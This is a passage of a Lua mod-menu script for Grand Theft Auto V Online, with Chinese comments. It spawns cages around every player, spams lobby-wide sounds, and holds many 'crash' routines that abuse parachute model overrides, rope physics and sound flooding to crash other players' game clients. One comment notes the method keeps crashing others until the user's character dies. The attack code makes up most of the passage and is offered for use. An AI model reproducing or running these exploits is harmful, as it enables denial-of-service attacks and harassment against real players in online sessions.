            util.trigger_script_event(1 << pid, {1858712297, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end
function sendscriptevent_four()
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                pos.z = pos.z + 0.95  
                local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                pos1.z = pos1.z - 0.90
                local cage = util.joaat("prop_feeder1_cr")
                STREAMING.REQUEST_MODEL(cage)
                OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos.x, pos.y ,pos.z , true, true)
                OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos1.x, pos1.y ,pos1.z , true, true)
        end
    end
end

--防空警报
function fangkongjingbao()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
    for i = 1, #Audio_POS do
 
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    pos.z = 2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        pos.z = -2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    
    for pid = 0, 31 do
        local pos =	NETWORK.NETWORK_GET_LAST_PLAYER_POS_RECEIVED_OVER_NETWORK(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        end
    end
end

--噪音
function zaoyin()		
    --{"Bed", "WastedSounds"}
        local pos = v3()
        local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
        for i = 1, #Audio_POS do
    
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = 2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = -2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    
            for pid = 0, 31 do
                local pos =	NETWORK.NETWORK_GET_LAST_PLAYER_POS_RECEIVED_OVER_NETWORK(pid)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
        end
    end		
end
 
function carcrashv1()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 20 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 1381105889)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end

function personlcrashv1()
    local spped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for n = 0 , 5 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end

function personalcrashv2()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")			
        end
end

function personalcrashv3()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("v_ilev_light_wardrobe_face")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("v_ilev_light_wardrobe_face")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    util.yield(500)
end

function personalcrashv4()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_mk_num_6")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    
            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end

    function personalcrashv5()
        for n = 0 , 5 do
            PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
            object_hash = 1117917059
            STREAMING.REQUEST_MODEL(object_hash)
            while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
            end
            util.yield(1000)
            menu.trigger_commands("tplsia")
            bush_hash = -908104950
            STREAMING.REQUEST_MODEL(bush_hash)
            while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
            end
            util.yield(1000)
            menu.trigger_commands("tplsia")
    end
end

function jesus_help_me()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
    for i = 1, 20 do                   
        ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, util.joaat("prop_beach_parasol_05"))
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
        entities.delete_by_handle(SelfPlayerPed)
    end
end

function big_pussy()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local mdl = util.joaat("A_C_Cat_01")
    local mdl2 = util.joaat("U_M_Y_Zombie_01")
    local mdl3 = util.joaat("A_F_M_ProlHost_01")
    local mdl4 = util.joaat("A_M_M_SouCent_01")
    local veh_mdl = util.joaat("insurgent2")
    local veh_mdl2 = util.joaat("brawler")
    util.request_model(veh_mdl)
    util.request_model(veh_mdl2)
    util.request_model(mdl)
    util.request_model(mdl2)
    util.request_model(mdl3)
    util.request_model(mdl4)
    for i = 1, 250 do
        local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
        local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
        local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
        local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
        PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
    
        PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
    
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
    
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
    
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
        util.yield(100)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
        
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
    
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)
    
        ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
    
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
        PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
    entities.delete_by_handle(mdl)
    entities.delete_by_handle(mdl2)
    entities.delete_by_handle(mdl3)
    entities.delete_by_handle(mdl4)
    entities.delete_by_handle(veh_mdl)
    entities.delete_by_handle(veh_mdl2)
    util.yield(1000)
    end

    function soundcrash_all()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
		end
         util.toast("Sound Spam Crash [Lobby] executed successfully.")
end

function CARGO()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
    notification("Go Fuck Your Self",colors.red)
    util.toast("Go Fuck Your Self")
end

function rlengzhan()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = -908104950
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end

function numbercrash()
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
     local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)

     playpos.x = playpos.x + 10

     local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
     local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
     local pedc = CreatePed(26, 2597531625, playpos, 0)
     local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)

     local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
     PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
     util.yield(2500)
     PHYSICS.DELETE_CHILD_ROPE(ropec)
     entities.delete_by_handle(carc)
     entities.delete_by_handle(pedc)
end

function natural_crash_all()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, false)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(25)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        local pos = players.get_position(user)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, true)
        end

function dgcrash()
    local user = players.user()
    local user_ped = players.user_ped()
    local setpackmodel = {}
    local obj_hash = {util.joaat("h4_prop_bush_mang_ad"),util.joaat("urbanweeds02_l1")}
    while true do
    crash_pos = players.get_position(user)
    PED.SET_PED_COMPONENT_VARIATION(user_ped,5,8,0,0)
    for mmtcrash = 1 , 1 do
        util.yield(500)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user_ped,crash_pos.x,crash_pos.y,crash_pos.z,false, false, false) 
        for Cra_ove , mmtcrash in pairs (obj_hash) do
            setpackmodel[Cra_ove] = PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user,mmtcrash)
            util.yield(0)
        end
        PED.SET_PED_COMPONENT_VARIATION(user_ped,-1087,-3012,13.94)
        util.yield(0)
    end
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user_ped,crash_pos.x,crash_pos.y,crash_pos.z,true, true, true)  
    end
end

------------------------------------
-----------线上模式服务-------------
------------------------------------
function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local function CanSpawnNanoDrone()
	return BitTest(read_global.int(1962996), 23)
end

local function CanUseDrone()
	if not is_player_active(players.user(), true, true) then
		return false
	end
	if util.is_session_transition_active() then
		return false
	end
	if players.is_in_interior(players.user()) then
		return false
	end
	if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		return false
	end
	if PED.IS_PED_IN_ANY_TRAIN(players.user_ped()) or
	PLAYER.IS_PLAYER_RIDING_TRAIN(players.user()) then
		return false
	end
	if PED.IS_PED_FALLING(players.user_ped()) then
		return false
	end
	if ENTITY.GET_ENTITY_SUBMERGED_LEVEL(players.user_ped()) > 0.3 then
